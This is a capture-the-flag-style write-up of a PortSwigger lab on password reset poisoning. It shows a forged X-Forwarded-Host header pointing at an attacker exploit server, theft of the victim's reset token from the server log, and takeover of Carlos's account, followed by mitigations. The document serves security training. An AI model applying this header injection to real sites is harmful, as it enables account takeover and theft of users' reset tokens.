# Lab: Password Reset Poisoning via Middleware

## Overview

This lab demonstrates a **Password Reset Poisoning** vulnerability caused by improper handling of the `X-Forwarded-Host` HTTP header.

The application uses the host information from the request to generate password reset links.

Because the application trusts the attacker-controlled `X-Forwarded-Host` header, an attacker can make the password reset link point to an attacker-controlled server instead of the legitimate application.

When the victim clicks the poisoned link, their password reset token is sent to the attacker's server.

The attacker can then use the stolen token to reset the victim's password and take over the account.

> **Note:** All testing was performed within the authorized PortSwigger Web Security Academy lab environment.

---

## Difficulty

**Practitioner**

## Vulnerability

- Password Reset Poisoning
- Host Header Injection
- Improper Trust of `X-Forwarded-Host`
- Account Takeover

## Tools

- Burp Suite Community Edition
- Burp Repeater
- Burp Proxy
- PortSwigger Exploit Server
- Email Client

---

## Objective

Steal Carlos's password reset token by manipulating the `X-Forwarded-Host` header, then use the token to reset Carlos's password and access his account.

---

# 1. Analyze the Password Reset Functionality

First, I investigated the password reset functionality using my own account.

The application sends a password reset email containing a unique reset token.

The reset link has a structure similar to:

```text
https://TARGET-LAB/forgot-password?temp-forgot-password-token=TOKEN
```

The token is intended to authorize the password reset operation.

---

# 2. Identify the Host Header Vulnerability

I captured the:

```text
POST /forgot-password
```

request using Burp Suite.

The request was sent to **Burp Repeater** for further testing.

I then tested the following header:

```http
X-Forwarded-Host: example.com
```

The application accepted the header and used its value when generating the password reset URL.

This indicates that the application trusts the client-controlled `X-Forwarded-Host` header.

---

# 3. Prepare the Exploit Server

I opened the provided PortSwigger Exploit Server and copied its URL.

For example:

```text
YOUR-EXPLOIT-SERVER-ID.exploit-server.net
```

The exploit server will be used to capture the password reset request containing Carlos's reset token.

---

# 4. Poison Carlos's Password Reset Link

In Burp Repeater, I modified the password reset request.

I added:

```http
X-Forwarded-Host: YOUR-EXPLOIT-SERVER-ID.exploit-server.net
```

I also changed the username parameter:

```text
username=wiener
```

to:

```text
username=carlos
```

The request now targets Carlos while specifying the attacker-controlled host.

Conceptually:

```http
POST /forgot-password
X-Forwarded-Host: YOUR-EXPLOIT-SERVER-ID.exploit-server.net

username=carlos
```

I then sent the request.

---

# 5. Capture Carlos's Reset Token

The application sends a password reset email to Carlos.

Because the application trusts the `X-Forwarded-Host` header, the generated reset URL points to the attacker-controlled exploit server.

When Carlos clicks the link, his browser makes a request similar to:

```text
GET /forgot-password?temp-forgot-password-token=TOKEN
```

The request is received by the exploit server.

I opened:

```text
Exploit Server > Access Log
```

and located the incoming request.

The password reset token was included as a query parameter:

```text
temp-forgot-password-token=VICTIM-TOKEN
```

This token was then recorded for use in the next step.

---

# 6. Use the Stolen Token

Next, I opened the email client and obtained a legitimate password reset URL for my own account.

The legitimate URL follows a structure similar to:

```text
https://TARGET-LAB/forgot-password?temp-forgot-password-token=TOKEN
```

Instead of using my own token, I replaced the token with the stolen Carlos token:

```text
temp-forgot-password-token=VICTIM-TOKEN
```

This allows the password reset process to be completed using Carlos's stolen token.

---

# 7. Reset Carlos's Password

I loaded the modified password reset URL in the browser.

The application accepted the stolen token and displayed the password reset form.

I then assigned a new password to Carlos's account.

This confirms that the stolen reset token was valid.

---

# 8. Log in as Carlos

Finally, I logged in using:

```text
Username: carlos
Password: [NEW PASSWORD]
```

The login was successful and I was able to access Carlos's account.

This completed the lab and demonstrated the account takeover impact.

---

# Attack Chain

The complete attack can be summarized as:

```text
Password Reset Functionality
          ↓
Identify X-Forwarded-Host Trust
          ↓
Manipulate X-Forwarded-Host
          ↓
Target username=carlos
          ↓
Password Reset Link Points to Attacker Server
          ↓
Carlos Clicks the Link
          ↓
Reset Token Sent to Attacker Server
          ↓
Steal Carlos's Reset Token
          ↓
Use Token on Legitimate Reset Page
          ↓
Set New Password
          ↓
Login as Carlos
          ↓
Account Takeover
```

---

# Key Observation

The key vulnerability is that the application trusts the client-controlled:

```http
X-Forwarded-Host
```

header when constructing password reset links.

The application should generate reset URLs using a trusted server-side hostname.

Instead, the attacker can influence the domain included in the password reset email.

Because Carlos automatically clicks links received by email, the poisoned reset link causes his browser to send the password reset token to the attacker's exploit server.

---

# Impact

Password reset poisoning can result in:

- Password reset token theft
- Unauthorized password changes
- Account takeover
- Access to private user information
- Potential compromise of other accounts if password reuse exists

The vulnerability is particularly dangerous because the attacker does not need to know the victim's existing password.

---

# Root Cause

The primary root cause is **trusting attacker-controlled host information when generating password reset URLs**.

The application effectively performs:

```text
Client Request
      ↓
X-Forwarded-Host
      ↓
Generate Reset URL
      ↓
Send URL to User
```

An attacker can therefore influence the destination of the reset link.

The password reset token itself may be secure, but it becomes compromised because it is delivered to an attacker-controlled domain.

---

# Mitigation

## 1. Do Not Trust Client-Controlled Host Headers

Do not use arbitrary values from:

```http
Host
X-Forwarded-Host
X-Forwarded-Proto
```

to construct security-sensitive URLs without proper validation.

## 2. Use a Trusted Canonical Host

Password reset URLs should be generated using a server-side configured hostname.

For example:

```text
https://example.com/forgot-password?token=...
```

rather than dynamically trusting a request header.

## 3. Validate Proxy Headers

If `X-Forwarded-Host` is required in a reverse-proxy environment:

- Only trust headers from known proxies.
- Validate the expected hostname.
- Strip or overwrite untrusted forwarding headers at the proxy layer.

## 4. Protect Reset Tokens

Password reset tokens should:

- Be cryptographically random.
- Be unpredictable.
- Expire quickly.
- Be single-use.
- Be invalidated after a successful password reset.

## 5. Consider Additional Verification

For sensitive account changes, additional verification mechanisms can reduce the impact of stolen reset tokens.

---

# Skills Practiced

- Password Reset Testing
- Password Reset Poisoning
- Host Header Injection
- HTTP Header Manipulation
- `X-Forwarded-Host` Analysis
- Burp Suite
- Burp Repeater
- Burp Proxy
- Exploit Server
- Token Theft
- Authentication Testing
- Account Takeover Analysis

---

# Screenshots

Recommended screenshots for the write-up:

1. Password reset request
2. Password reset email
3. `X-Forwarded-Host` header
4. Modified request in Burp Repeater
5. Exploit Server URL
6. Exploit Server access log
7. Stolen password reset token
8. Modified reset URL
9. Password reset page
10. Successful login as Carlos

> Redact password reset tokens, session cookies, passwords, and other sensitive values before publishing screenshots publicly.

---

# Lessons Learned

- Password reset functionality must be tested as an authentication mechanism.
- Host headers can affect security-sensitive URL generation.
- `X-Forwarded-Host` should not automatically be trusted.
- A secure password reset token can still be compromised if it is sent to an attacker-controlled domain.
- Password reset poisoning can lead directly to account takeover.
- Security testing should consider how different components such as reverse proxies and application servers interact.

---

# References

- PortSwigger Web Security Academy
- OWASP Password Reset Cheat Sheet
- OWASP HTTP Host Header Attack Cheat Sheet
- OWASP Authentication Cheat Sheet

---

# Tags

`Password Reset Poisoning`
`Host Header Injection`
`X-Forwarded-Host`
`Authentication`
`Account Takeover`
`Token Theft`
`Burp Suite`
`Burp Repeater`
`Web Security`